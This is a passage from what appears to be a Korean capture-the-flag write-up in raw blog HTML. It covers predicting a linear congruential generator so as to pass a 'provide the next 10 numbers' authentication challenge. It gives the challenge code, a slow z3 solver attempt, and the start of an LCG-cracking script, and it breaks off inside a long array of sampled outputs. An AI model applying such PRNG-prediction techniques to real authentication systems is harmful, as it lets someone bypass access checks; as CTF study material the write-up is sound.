class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, m, a, c</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rand</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.m = m</span><br><span class="line">        self.a = a</span><br><span class="line">        self.c = c</span><br><span class="line">        self.seed = seed</span><br><span class="line">        <span class="keyword">if</span> seed % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># initial state must be odd</span></span><br><span class="line">            self.seed += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.c) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    seed = secrets.choice(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x7fffffffffffffff</span>))</span><br><span class="line">    rng = Rand(seed)</span><br><span class="line">    </span><br><span class="line">    chall = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        chall.append(rng.rand())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Authenticate. Provide the next 10 numbers following&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chall:</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> x != rng.rand():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Access denied.&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Access granted.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>seed = secrets.choice(range(0, 0x7fffffffffffffff))</code>이런 식으로 <code>seed</code>를 랜덤으로 만들고, <code>Rand</code> 클래스 객체를 만든다. 그리고 <code>rng.rand()</code>한 값 10개를 출력해주는데 이것을 바탕으로 다음 <code>rng.rand()</code>를 10번 연속으로 맞춰야 <code>flag</code>를 출력해준다. 문제는 <code>rng.rand()</code>가 아래같이 구현되어 있어서 문제에서 출력해준 <code>rng.rand()</code> 값을 바탕으로 다음 <code>rng.rand()</code> 값을 구할 수 있을 것 같은 기분이다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">self</span>):</span><br><span class="line">    self.seed = (self.a * self.seed + self.c) % self.m</span><br><span class="line">    <span class="keyword">return</span> self.seed</span><br></pre></td></tr></table></figure><p><code>m</code>, <code>a</code>, <code>c</code>가 고정되어 있어서 방정식을 이용해서 구할 수 있을 것 같다!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a * seed[i] + c) % m == seed[i+1]</span><br></pre></td></tr></table></figure><p>참고로 이걸 <code>LCG 알고리즘</code>이라고 하는데 위의 식에 따라 난수가 생성되는 알고리즘이다. 이 알고리즘은 변수를 통해 난수를 생성하기 때문에 변수를 알면 난수를 예측할 수 있다는 취약한 성질을 가지고 있다. 여기서 <code>m</code>, <code>a</code>, <code>c</code>를 구해야한다는 확신을 가졌다.</p><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">seed = [<span class="number">15292707418901107848</span>, <span class="number">3732399702731999469</span>, <span class="number">17727906530283792422</span>, <span class="number">5740441724751270531</span>, <span class="number">8708853459937082772</span>, <span class="number">10615078376953059625</span>, <span class="number">13017389135088601170</span>, <span class="number">12756134783055003231</span>, <span class="number">13176328566446297056</span>, <span class="number">5276211473026467749</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = BitVec(&#x27;a&#x27;, 64)</span></span><br><span class="line"><span class="comment"># c = BitVec(&#x27;c&#x27;, 64)</span></span><br><span class="line"><span class="comment"># m = BitVec(&#x27;m&#x27;, 64)</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">c = Int(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">m = Int(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(m &gt; <span class="number">0</span>)</span><br><span class="line">s.add(a &gt; <span class="number">0</span>)</span><br><span class="line">s.add(c &gt;= <span class="number">0</span>)</span><br><span class="line">s.add(m &gt; a)</span><br><span class="line">s.add(m &gt; c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="comment"># s.add((a * seed[i] + c) % m == seed[i+1])</span></span><br><span class="line">    s.add( ((a%m * seed[i]%m + c%m) % m) == seed[i+<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(s.check())</span><br><span class="line">    <span class="comment"># print(s.model())</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>처음에는 이런식으로 z3를 이용해서 문제를 풀고 싶었다. 하지만 속도가 너무 오래 걸렸다. <code>m</code>, <code>a</code>, <code>c</code>를 구하는데 하루종일 걸릴 것 같아서 돌려놓고 다른 방법을 찾기로 했다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>결국 아래 롸업 참고해서 <code>m</code>, <code>a</code>, <code>c</code>를 구하는 스크립트를 찾았고 그대로 이용했다!.</p><ul><li><a href="https://ctftime.org/writeup/12046">https://ctftime.org/writeup/12046</a></li></ul><h3 id="Solved-Code"><a href="#Solved-Code" class="headerlink" title="Solved Code"></a>Solved Code</h3><ul><li><code>lcg_cracker.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">value_arr = [</span><br><span class="line">[<span class="number">8867289026099616930</span>, <span class="number">3100388368458364911</span>, <span class="number">11012612612822111152</span>, <span class="number">3553763262634053301</span>, <span class="number">5401992163525506830</span>, <span class="number">3802577809068939019</span>, <span class="number">4123451793823069756</span>, <span class="number">7817012668148538993</span>, <span class="number">4418295964672193722</span>, <span class="number">9714516383028541031</span>],</span><br><span class="line">[<span class="number">14895006062848545614</span>, <span class="number">13184494282524308555</span>, <span class="number">5839645882409261180</span>, <span class="number">15553940338338437553</span>, <span class="number">3310727070198197498</span>, <span class="number">7079238959161008039</span>, <span class="number">8852142265661212744</span>, <span class="number">2055261898208476077</span>, <span class="number">12685862460417988070</span>, <span class="number">8327538304492250947</span>],</span><br><span class="line">[<span class="number">16833079321975897880</span>, <span class="number">17784340646344753597</span>, <span class="number">9634395732957591606</span>, <span class="number">690518920529962707</span>, <span class="number">10752317369148323620</span>, <span class="number">4040135522852265209</span>, <span class="number">2068189971163025250</span>, <span class="number">13577899494281881007</span>, <span class="number">14537861419972208752</span>, <span class="number">6988257997766616693</span>],</span><br><span class="line">[<span class="number">8811210512227857652</span>, <span class="number">17677714985016526345</span>, <span class="number">2277225101309911218</span>, <span class="number">9554579400707461183</span>, <span class="number">13629936068980515136</span>, <span class="number">18128385074177963653</span>, <span class="number">14926717179739533854</span>, <span class="number">15372561348002497115</span>, <span class="number">9242320810727858892</span>, <span class="number">10530837434097508673</span>],</span><br><span class="line">[<span class="number">2991159697670699038</span>, <span class="number">3475834328473165915</span>, <span class="number">24895706424277196</span>, <span class="number">1717803743275126593</span>, <span class="number">7847993843726425290</span>, <span class="number">6555997079546348215</span>, <span class="number">9641940719668788120</span>, <span class="number">1211123003602522173</span>, <span class="number">9780510953735823542</span>, <span class="number">10772469154227966291</span>],</span><br><span class="line">[<span class="number">3185088266943822372</span>, <span class="number">16856905608318675961</span>, <span class="number">981610330286889570</span>, <span class="number">12390880568666725551</span>, <span class="number">6420531847364688752</span>, <span class="number">294839699134285173</span>, <span class="number">1897195166556125390</span>, <span class="number">1779257976405790667</span>, <span class="number">12088335929742246396</span>, <span class="number">3991695835285178673</span>],</span><br><span class="line">[<span class="number">10238209914032284972</span>, <span class="number">5460209267264701729</span>, <span class="number">7819557967073387050</span>, <span class="number">4593921590486709655</span>, <span class="number">3385940490520588792</span>, <span class="number">12268964961406007325</span>, <span class="number">16455099020084682774</span>, <span class="number">10150443889560462899</span>, <span class="number">17851097652418530308</span>, <span class="number">14240629152048184665</span>],</span><br><span class="line">[<span class="number">8349943537494362534</span>, <span class="number">4297037802114914819</span>, <span class="number">1347703166576296724</span>, <span class="number">757798125216715945</span>, <span class="number">15394582492534297042</span>, <span class="number">10761779783422053855</span>, <span class="number">4693042107739651424</span>, <span class="number">10225256180973570853</span>, <span class="number">4566401686213427518</span>, <span class="number">1487067095664121339</span>],</span><br><span class="line">[<span class="number">11987973417146959732</span>, <span class="number">15513426539919950473</span>, <span class="number">515274979322588978</span>, <span class="number">17107229499549087935</span>, <span class="number">18253958825185315776</span>, <span class="number">5144561925537278725</span>, <span class="number">4486635461590751390</span>, <span class="number">14429941670409020123</span>, <span class="number">17988539351616152908</span>, <span class="number">5277362322974592449</span>],</span><br><span class="line">[<span class="number">3272875691678361420</span>, <span class="number">4467493841292318657</span>, <span class="number">13109169869817161546</span>, <span class="number">642261405616117559</span>, <span class="number">7422548840093008408</span>, <span class="number">14093779976259686589</span>, <span class="number">13240126529021690678</span>, <span class="number">9678270890728627667</span>, <span class="number">3717904806731450916</span>, <span class="number">16727758706245942265</span>],</span><br><span class="line">[<span class="number">13961749608401819040</span>, <span class="number">4130031146828829797</span>, <span class="number">8270988025545981822</span>, <span class="number">17295851551386197307</span>, <span class="number">12822136328236310828</span>, <span class="number">17730435183956521249</span>, <span class="number">5914918828169559594</span>, <span class="number">2301029522089476503</span>, <span class="number">11197084434497465848</span>, <span class="number">16282318958233527325</span>],</span><br><span class="line">[<span class="number">13935820998792231868</span>, <span class="number">2340957083767314929</span>, <span class="number">13952086190268317242</span>, <span class="number">3463255295617205735</span>, <span class="number">17603686513072576392</span>, <span class="number">15616004610886916077</span>, <span class="number">7593161876043215654</span>, <span class="number">7419335383114434947</span>, <span class="number">13872051444738117780</span>, <span class="number">16387601927742994473</span>],</span><br><span class="line">[<span class="number">2367708137021733318</span>, <span class="number">15797908864823186083</span>, <span class="number">1697811323936294452</span>, <span class="number">6468516909347007561</span>, <span class="number">3605808975914282994</span>, <span class="number">8993146379861355647</span>, <span class="number">11784545778018336384</span>, <span class="number">1476919440044939461</span>, <span class="number">9673720994553064798</span>, <span class="number">3403961970617612955</span>],</span><br><span class="line">[<span class="number">14632104118495609642</span>, <span class="number">13491004195881278103</span>, <span class="number">8542085830330608376</span>, <span class="number">17554856007815877917</span>, <span class="number">12246699748174721302</span>, <span class="number">14918799307125947187</span>, <span class="number">14826228137665017092</span>, <span class="number">8438817444860840537</span>, <span class="number">10429337410401897026</span>, <span class="number">201262443058381839</span>],</span><br><span class="line">[<span class="number">727242865172403940</span>, <span class="number">13286269549476768697</span>, <span class="number">12862139302129010978</span>, <span class="number">2043896308843279983</span>, <span class="number">11901636794219457584</span>, <span class="number">9556199557922302261</span>, <span class="number">13741726916804549518</span>, <span class="number">7395209500326784395</span>, <span class="number">12207365532390229692</span>, <span class="number">12204738417996026097</span>],</span><br><span class="line">[<span class="number">5226361193323484432</span>, <span class="number">10130784938838945173</span>, <span class="number">16494630052633807214</span>, <span class="number">12878085135450049259</span>, <span class="number">3144158807994921372</span>, <span class="number">14032772940844506961</span>, <span class="number">9030641085374296346</span>, <span class="number">14371680458411244615</span>, <span class="number">13968515723769642856</span>, <span class="number">4596893107208673101</span>],</span><br><span class="line">[<span class="number">5582569318269685702</span>, <span class="number">16262401486417281187</span>, <span class="number">15301058140219305012</span>, <span class="number">4308599473687603785</span>, <span class="number">2145458505091835378</span>, <span class="number">462684261660228223</span>, <span class="number">13478469980846195840</span>, <span class="number">7677224992909932229</span>, <span class="number">13219690446917878622</span>, <span class="number">8268181225565595803</span>],</span><br><span class="line">[<span class="number">1523660276195024986</span>, <span class="number">12898838688908966023</span>, <span class="number">4576153996660178088</span>, <span class="number">2159976516489910669</span>, <span class="number">1464427048127423302</span>, <span class="number">8811745952244449827</span>, <span class="number">17714660346161386420</span>, <span class="number">4826455020305256393</span>, <span class="number">984003074290762098</span>, <span class="number">12555979904933929983</span>],</span><br><span class="line">[<span class="number">126547082954464156</span>, <span class="number">8731748723858026833</span>, <span class="number">12194851587498199834</span>, <span class="number">11341276220445965895</span>, <span class="number">7784808114970478952</span>, <span class="number">2196181795386050893</span>, <span class="number">3962591291961098758</span>, <span class="number">15164382113382091747</span>, <span class="number">13324697695629440116</span>, <span class="number">15513681386663338889</span>],</span><br><span class="line">[<span class="number">2109089224935408226</span>, <span class="number">16399948004576306351</span>, <span class="number">6345023819482489712</span>, <span class="number">13531529848972103029</span>, <span class="number">11338355893597528270</span>, <span class="number">7583305562428282827</span>, <span class="number">6739249743684069884</span>, <span class="number">3839630471462031665</span>, <span class="number">6680085498946462330</span>, <span class="number">18204041658276662055</span>],</span><br><span class="line">[<span class="number">14630982926170580926</span>, <span class="number">13413641925454296699</span>, <span class="number">3204089170868891500</span>, <span class="number">18167967979148445793</span>, <span class="number">17657937622702801514</span>, <span class="number">912587101662897879</span>, <span class="number">7628277793611298872</span>, <span class="number">9842333695312176989</span>, <span class="number">15038238322996354134</span>, <span class="number">4620776159013544819</span>],</span><br><span class="line">[<span class="number">14704701709580170488</span>, <span class="number">53493907006424861</span>, <span class="number">3691079583443315478</span>, <span class="number">14876818299364597043</span>, <span class="number">11929538602131857156</span>, <span class="number">11481424303877872729</span>, <span class="number">17455025871772050498</span>, <span class="number">5358420361150629391</span>, <span class="number">796123445202395728</span>, <span class="number">18039029571546202069</span>],</span><br><span class="line">[<span class="number">18200670961985626810</span>, <span class="number">1467699364758740071</span>, <span class="number">9037535799805306888</span>, <span class="number">14847415754150972013</span>, <span class="number">9900762982391730086</span>, <span class="number">623115057775966211</span>, <span class="number">6101450839122565396</span>, <span class="number">15171738277846876841</span>, <span class="number">13832273043699611602</span>, <span class="number">13642892256086068191</span>],</span><br><span class="line">[<span class="number">2782294491294682690</span>, <span class="number">7510879162237589519</span>, <span class="number">1741828130526231632</span>, <span class="number">9505676564052672981</span>, <span class="number">10255640339800129198</span>, <span class="number">6662908645245953323</span>, <span class="number">17018838752941540572</span>, <span class="number">12154997309264547729</span>, <span class="number">8591331022323970650</span>, <span class="number">2506030181648323207</span>],</span><br><span class="line">[<span class="number">11234052632499834174</span>, <span class="number">386380546687390203</span>, <span class="number">8213513647720372460</span>, <span class="number">13330119481419151329</span>, <span class="number">15887784606153412586</span>, <span class="number">7899237475721923159</span>, <span class="number">10091807687235701176</span>, <span class="number">13805199692009971421</span>, <span class="number">11774830989500895702</span>, <span class="number">806599032341532403</span>],</span><br><span class="line">[<span class="number">8300049183692798058</span>, <span class="number">854327389806965975</span>, <span class="number">3608357675551997496</span>, <span class="number">9169006654863656285</span>, <span class="number">5472160679467528790</span>, <span class="number">8644205409068454259</span>, <span class="number">6154362867017692228</span>, <span class="number">375924128901076633</span>, <span class="number">7492020820464736130</span>, <span class="number">440602548199347791</span>],</span><br><span class="line">[<span class="number">11558370982278543894</span>, <span class="number">4317602607708809267</span>, <span class="number">2766674752555013636</span>, <span class="number">6433117189200424793</span>, <span class="number">1163228285800072002</span>, <span class="number">6475775425366761743</span>, <span class="number">4106646581277321552</span>, <span class="number">6657453002491912917</span>, <span class="number">16642399402912752558</span>, <span class="number">4627426230987726379</span>],</span><br><span class="line">[<span class="number">9176831416081544290</span>, <span class="number">6012069203501801135</span>, <span class="number">9004405420014142832</span>, <span class="number">12561419548560652149</span>, <span class="number">18187721460045624014</span>, <span class="number">574183730898547147</span>, <span class="number">2725189284580649980</span>, <span class="number">3570619898969332529</span>, <span class="number">6565100070659773562</span>, <span class="number">10270047106495137063</span>],</span><br><span class="line">[<span class="number">13677842479808722104</span>, <span class="number">2987183347614692829</span>, <span class="number">3201466174608737494</span>, <span class="number">17986981237197819379</span>, <span class="number">5169852428109578948</span>, <span class="number">6231680139079466777</span>, <span class="number">5710815901163520514</span>, <span class="number">6664671632382331599</span>, <span class="number">17140484865351641616</span>, <span class="number">2101834991851968149</span>],</span><br><span class="line">[<span class="number">4633588486946452916</span>, <span class="number">6122956346242873801</span>, <span class="number">16655618269148156786</span>, <span class="number">5539528001230618111</span>, <span class="number">13292550610721617408</span>, <span class="number">13295532528023572037</span>, <span class="number">13501284821858441438</span>, <span class="number">9251449022754878491</span>, <span class="number">11160684063961861004</span>, <span class="number">13770693391276793089</span>],</span><br><span class="line">[<span class="number">17299383331387067396</span>, <span class="number">13065829148296346969</span>, <span class="number">16098495694389463362</span>, <span class="number">3991558490299875087</span>, <span class="number">17163118798757658448</span>, <span class="number">3663576396867129557</span>, <span class="number">12979098425607768494</span>, <span class="number">10114075828877548587</span>, <span class="number">15341701465297442780</span>, <span class="number">7112988904079109777</span>],</span><br><span class="line">[<span class="number">1428568366097891942</span>, <span class="number">6337496892206785987</span>, <span class="number">13012171866948546004</span>, <span class="number">12396143281391196777</span>, <span class="number">6783659025353203346</span>, <span class="number">6903870906632240543</span>, <span class="number">15198490714885807136</span>, <span class="number">15678191199385801957</span>, <span class="number">11884036482466341374</span>, <span class="number">8341778046957283771</span>],</span><br><span class="line">[<span class="number">12077661547009871844</span>, <span class="number">3255163426751334585</span>, <span class="number">3245347561327467042</span>, <span class="number">2568052847080606575</span>, <span class="number">11174949785175889200</span>, <span class="number">14755028155044738613</span>, <span class="number">3526018644061625486</span>, <span class="number">3487613482027987595</span>, <span class="number">837657301706973116</span>, <span class="number">2458121596652490225</span>],</span><br><span class="line">[<span class="number">5523160823405994428</span>, <span class="number">12163215340822583281</span>, <span class="number">9158375199828423738</span>, <span class="number">4738590282036483047</span>, <span class="number">13368080207454952840</span>, <span class="number">60330628914165229</span>, <span class="number">4162813395077400870</span>, <span class="number">10532963154697385859</span>, <span class="number">7351438799447111316</span>, <span class="number">9187187171692787241</span>],</span><br><span class="line">[<span class="number">873931018331865996</span>, <span class="number">4961008043770098945</span>, <span class="number">10268161693364898186</span>, <span class="number">7526882041215013495</span>, <span class="number">2846026779968485976</span>, <span class="number">11908407080730016253</span>, <span class="number">10023349327150850422</span>, <span class="number">9081572846155269395</span>, <span class="number">17885971952298384996</span>, <span class="number">16646955843758158137</span>],</span><br><span class="line">[<span class="number">14117057574820939498</span>, <span class="number">14846280829748141399</span>, <span class="number">9822453198596417720</span>, <span class="number">13666484049608964573</span>, <span class="number">2203451663831423190</span>, <span class="number">4464212214691787251</span>, <span class="number">12882737634380494532</span>, <span class="number">3465181234195645209</span>, <span class="number">17736576274984900098</span>, <span class="number">6338654109127700175</span>],</span><br><span class="line">[<span class="number">5658271824067632014</span>, <span class="number">3039130312766025099</span>, <span class="number">6785806770050664124</span>, <span class="number">7052065290757034225</span>, <span class="number">6977159145787019578</span>, <span class="number">1808635142856008935</span>, <span class="number">14115360414807306888</span>, <span class="number">14729176788807491309</span>, <span class="number">1742274373691561510</span>, <span class="number">9536467342460434563</span>],</span><br><span class="line">[<span class="number">8457322449329128800</span>, <span class="number">11706182718713787173</span>, <span class="number">14516612421740595518</span>, <span class="number">5522077119785303547</span>, <span class="number">12088439790994912492</span>, <span class="number">3998862261719139297</span>, <span class="number">17667079026686888938</span>, <span class="number">1543343976564930135</span>, <span class="number">14257014014432421304</span>, <span class="number">6056531089230834397</span>],</span><br><span class="line">[<span class="number">5853949490429562094</span>, <span class="number">16540889291739200619</span>, <span class="number">16069972633722194204</span>, <span class="number">2023467304258303185</span>, <span class="number">10492035477856058522</span>, <span class="number">4527429097395525063</span>, <span class="number">17244702540938403560</span>, <span class="number">9292854607338542285</span>, <span class="number">14017669400234662790</span>, <span class="number">7988496783295048547</span>],</span><br><span class="line">[<span class="number">8990859015354022950</span>, <span class="number">11626717627012380291</span>, <span class="number">9033521094343520660</span>, <span class="number">14570401077287722281</span>, <span class="number">9233494352537050194</span>, <span class="number">9921811818931708511</span>, <span class="number">2075484779034477536</span>, <span class="number">14081241237412088741</span>, <span class="number">12374953548537439166</span>, <span class="number">5321567458443928187</span>],</span><br><span class="line">[<span class="number">2501824620693468540</span>, <span class="number">6605202164463364785</span>, <span class="number">13037091578942931450</span>, <span class="number">14115603409003792551</span>, <span class="number">14745943388365002056</span>, <span class="number">2899169743159803053</span>, <span class="number">15575271540930894566</span>, <span class="number">4782580049077731395</span>, <span class="number">16403374133301088852</span>, <span class="number">6581426701492482281</span>],</span><br><span class="line">[<span class="number">10614745564617910298</span>, <span class="number">12994425083963297607</span>, <span class="number">11171615255409057384</span>, <span class="number">14524945601133343309</span>, <span class="number">6097066497884901126</span>, <span class="number">14869218732448042211</span>, <span class="number">11405168484889573748</span>, <span class="number">12193374361579420809</span>, <span class="number">11239347632050213170</span>, <span class="number">751735515663540927</span>],</span><br><span class="line">[<span class="number">11822229604799408924</span>, <span class="number">4077103487938944721</span>, <span class="number">4618979562143911578</span>, <span class="number">5114940534867521479</span>, <span class="number">2442759505377501416</span>, <span class="number">2529709207661633229</span>, <span class="number">8529238665266728326</span>, <span class="number">16668401618408154467</span>, <span class="number">6421579100170458100</span>, <span class="number">367100142732370185</span>],</span><br><span class="line">[<span class="number">5451434008959662308</span>, <span class="number">7214065144025667001</span>, <span class="number">18155149021322681122</span>, <span class="number">16773429532725039215</span>, <span class="number">13668505188035505712</span>, <span class="number">2342910215262761781</span>, <span class="number">14086852263454150030</span>, <span class="number">12762114345439668107</span>, <span class="number">13588918370988173500</span>, <span class="number">15298163912706390769</span>],</span><br><span class="line">[<span class="number">2298694336461850902</span>, <span class="number">11035956626191299379</span>, <span class="number">5164500185108040964</span>, <span class="number">5862375371973345881</span>, <span class="number">17122275118260281922</span>, <span class="number">845362442548149263</span>, <span class="number">2989776314693644368</span>, <span class="number">3380380903056393685</span>, <span class="number">11885353426376544942</span>, <span class="number">8432647176761329963</span>],</span><br><span class="line">[<span class="number">15069683516895607374</span>, <span class="number">6790494538062018379</span>, <span class="number">7375521283540477820</span>, <span class="number">10848878574135076017</span>, <span class="number">10702858666938180602</span>, <span class="number">627485070352396967</span>, <span class="number">6402981706896287560</span>, <span class="number">17530624080524154541</span>, <span class="number">10574696765045808358</span>, <span 